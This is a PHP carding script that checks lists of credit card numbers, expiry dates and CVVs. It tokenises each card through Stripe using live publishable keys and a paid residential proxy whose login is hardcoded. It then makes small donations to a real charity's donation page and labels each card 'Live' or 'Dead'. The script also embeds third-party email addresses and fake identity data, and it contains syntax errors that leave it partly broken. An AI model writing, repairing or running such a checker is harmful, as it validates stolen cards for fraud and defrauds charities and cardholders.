<?php

error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];



function getStr2($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/
$ch = curl_init('');
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, 'http://zproxy.lum-superproxy.io:22225');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'lum-customer-hl_2540495b-zone-static:g6virm38eayq');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS,'type=card&billing_details[name]=lovan+bosco&billing_details[address][postal_code]=10080&card[number]='.$cc.'&card[cvc]=.$cvv.&card[exp_month]=.$mes.&card[exp_year]=.$ano.&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F8f6e154302%3B+stripe-js-v3%2F8f6e154302&time_on_page=100164&key=pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT')
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78',
'Origin: https://checkout.stripe.com',
'Referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=561f39d7-72cb-0708-1bff-23a6263992f8'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  'email=abhiyanqwe%40gmail.com&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2F551a9ed)&referrer=https%3A%2F%2Fromero.mercycommunity.org.au%2Fdonate%2F&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]=Texa+LOl&card[address_line1]=4283+Express+Lane&card[address_city]=sarasota&card[address_state]=FL&card[address_zip]=34249&card[address_country]=United+States&time_on_page=62202&guid=af14a93b-8b72-436b-8e14-90bb703993ea&muid=a0ab5dc8-564e-467a-8633-b87f2b0334cd&sid=ecad1248-6c38-4ddc-8c56-7046debb5c8a&key=pk_live_ENpCAEI7OOkqeDauRnZvxTpX');

$c = curl_exec($ch);

$token = trim(strip_tags(getstr($c,'id": "','"')));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://mercy-stripe.xct01.com/donate.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS 'utf8=%E2%9C%93&donation%5Bform_id%5D=63220&donation%5Bsms_message_id%5D=&donation%5Bform_version%5D=1.5&currency=usd&slug=project-fava&bf=d7d3dfe68a8719a0229869908adf175b&sf=7zad1i1ai6h63220&idempotency_key_index=&new_indian_regulation=false&s=MTY4MTc&t=0NDUwNg&donation_type=stripe&donation%5Butm_params_attributes%5D%5Butm_source%5D=&donation%5Butm_params_attributes%5D%5Butm_medium%5D=&donation%5Butm_params_attributes%5D%5Butm_campaign%5D=&donation%5Butm_params_attributes%5D%5Butm_term%5D=&donation%5Butm_params_attributes%5D%5Butm_content%5D=&fee_amount=0.43&embedded_form=true&plan_duration=&other_currency=usd&donation%5Bfmv_payment_attributes%5D%5Bamount%5D=&donation%5Bfmv_payment_attributes%5D%5Bdescription%5D=&donation%5Bsuggested_text%5D=&donation%5Bcustom_amount%5D=3&donation%5Bdonation_honor_attributes%5D%5Bhonor_type%5D=honor&donation%5Bdonation_honor_attributes%5D%5Bhonoree_name%5D=&donation%5Bdonation_honor_attributes%5D%5Brecipient_name%5D=&donation%5Bdonation_honor_attributes%5D%5Bnotify_type%5D=email&donation%5Bdonation_honor_attributes%5D%5Brecipient_email%5D=&donation%5Bdonation_honor_attributes%5D%5Brecipient_message%5D=&donation%5Bcomment%5D=&donation%5Bfirst_name%5D=lovan&donation%5Blast_name%5D=bosco&donation%5Banonymous_donation%5D=off&donation%5Bemail%5D=wasihun12344%40gmail.com&donation%5Bgdpr_consented%5D=on&ask_for_cover_fee=on&g-recaptcha-response-data%5Bdonation_create%5D=03AKH6MREdxNDhLAzlQIRv2d4AtdojuRR7cZEbzxelfOVdp67fMi9ue6bkHfkMzS1jg4NoOLaAivC1Cj6ZaAkuEiR4G5oQhaX_5aZiqcMBrlD_0TvlEGVdijl1NrO9CE-uVWr6zjAOYJU4S8QZpBi5n9H-atiV4mvSB1V0oLA6LFEQ0sx3b4OzKFQPglij0EyiWOo0lC3YV59En2Ph0gjvGe9KubgABHBcb4tiYmVXSTgPGCbW4WRTdT6TEyirV7CvrzvoaMuCaJNx3e0SZ1PUaDFGg3fm1q7f6UnwgX7RhseyT84vrw1YOhsX3BvVXp6qgL14QCXlIGaoK2WPSP2f8hJjImg6VInpFgpbmZKQqNrAPsK6GSSLyd55h_JP2pwWW61kUXxqzsLymKapmaNLDX1kyC5qbFtLDjZYPRvsVz1hJDQxBVh0eqACvYQ4Ui96e5h-QOXK2yDibe6cH8xIIP4y_4pAVSn5AQHWsq93N4mxTyCYypqW9urpbbW0cyWFOdV9iI5dO4EmK5nkBYjxwbeTY98Jk5cpKA&g-recaptcha-response=&stripe_token=&stripe_pm_id=.'$token.'&stripe_pi_id=&stripe_public_key=pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT&ask_for_cover_fee=on')
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 OPR/65.0.3467.78',
'Content-Type: text/plain;charset=UTF-8',
'Origin: https://romero.mercycommunity.org.au',
'Referer: https://romero.mercycommunity.org.au/donate/',
'Connection: keep-alive'
    ));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
  '{"amount":"1","plan":null,"frequency":"one-off","currency":"aud","email":"texas1123@gmail.com","token":"'.$token.'","description":"Romero Centre - $1 Gift"}');
$a = curl_exec($ch);
$message = trim(strip_tags(getstr(a,'"message":"','"')));
if (strpos($a, "Your card's security code is incorrect.")) {
 echo '<span class="badge badge-success">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b style="color: white;"> ❤Live❤ '.$bin.'('.$banco.'-'.$nivel.') sofoniyas <br>';
  }
else if(substr_count($c, 'incorrect_number') > 0){
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b> ❌ Invalid ❌ sofoniyas</b>';
  exit();
  }
  
else if (strpos($c, "Your card's security code is incorrect.")) {
 echo '<span class="badge badge-success">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b style="color: white;"> ❤Live❤ '.$bin.'('.$banco.'-'.$nivel.') sofoniyas <br>';
  }





else if (strpos($c, "Your card does not support this type of purchase.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Blocked 🔴'.$bin.'() ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛ </b>';
}


else if (strpos($a, "Your card was declined.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Dead 🔴'.$bin.'() ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛ </b>';
}


else if (strpos($a, "Your card number is incorrect.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b> ❌ Invalid ❌  ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛</b>';
}

else if (strpos($a, "Your card does not support this type of purchase.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Blocked 🔴'.$bin.'() ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛ </b>';
}
else if (strpos($c, "Your card was declined.")) {
  echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Dead 🔴'.$bin.'() ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛ </b>';
}
else {
 echo '<span class="badge badge-danger">💀Rejected💀</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>🔴 Unknown 🔴 '.$bin.'() ♛𝕋𝕙𝕖 𝕋𝕖𝕔𝕙ℝ𝕚𝕞♛ </b>';
}


?>